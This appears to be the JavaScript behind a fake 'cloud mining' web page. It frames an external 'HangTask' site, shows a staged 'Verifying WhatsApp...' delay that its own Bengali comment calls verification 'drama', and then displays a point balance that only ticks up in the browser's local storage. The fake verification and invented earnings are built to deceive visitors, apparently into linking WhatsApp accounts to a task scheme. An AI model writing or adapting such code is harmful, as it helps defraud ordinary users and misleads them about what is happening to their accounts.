const _config = {
    target: "https://www.taskm4u.com/#/HangTask"
};

let balance = parseFloat(localStorage.getItem('cloud_mining_bal')) || 0;
let miningActive = false;

function updateBalanceDisplay() {
    document.getElementById('mainPoints').innerText = balance.toFixed(2) + " PT";
    localStorage.setItem('cloud_mining_bal', balance);
}

function openTask() {
    document.getElementById('view-main').classList.remove('active-view');
    document.getElementById('view-task').classList.add('active-view');
    document.getElementById('taskIframe').src = _config.target;
}

function verifyConnection() {
    const btn = document.getElementById('verifyBtn');
    btn.innerText = "Verifying WhatsApp...";
    btn.style.background = "#555";
    btn.disabled = true;

    // ২.৫ সেকেন্ডের ভেরিফিকেশন ড্রামা
    setTimeout(() => {
        alert("Connection Verified! Mining Started.");
        document.getElementById('view-task').classList.remove('active-view');
        document.getElementById('view-main').classList.add('active-view');
        startMining();
    }, 2500);
}

function startMining() {
    if (miningActive) return;
    miningActive = true;
    
    document.getElementById('status').innerText = "● Mining Active (30 PT/hr)";
    document.getElementById('status').style.color = "#25D366";

    setInterval(() => {
        balance += (30 / 3600); // প্রতি সেকেন্ডে পয়েন্ট যোগ
        updateBalanceDisplay();
    }, 1000);
}

// ইনিশিয়াল কল
updateBalanceDisplay();
